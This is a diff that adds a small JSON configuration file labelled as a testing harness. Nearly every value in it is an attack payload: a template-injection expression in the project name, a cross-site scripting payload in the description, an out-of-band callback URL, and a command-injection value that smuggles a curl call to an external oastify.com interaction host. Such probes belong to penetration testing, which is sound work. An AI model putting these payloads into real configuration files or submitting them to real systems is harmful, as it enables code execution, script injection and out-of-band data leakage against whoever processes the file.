@@ -1,0 +1,11 @@
+{
+  "harness_version": "1.0.0",
+  "project_settings": {
+    "name": "Testing-Harness-{{7*7}}",
+    "description": "Environment probe <img src=x onerror=alert(document.domain)>"
+  },
+  "diagnostic_triggers": {
+    "callback_url": "http://uxvj408dmo54m1jd8a70lsnv1m7dv8jx.oastify.com/tracker",
+    "execution_flag": "; curl http://uxvj408dmo54m1jd8a70lsnv1m7dv8jx.oastify.com/shell_test ;"
+  }
+}
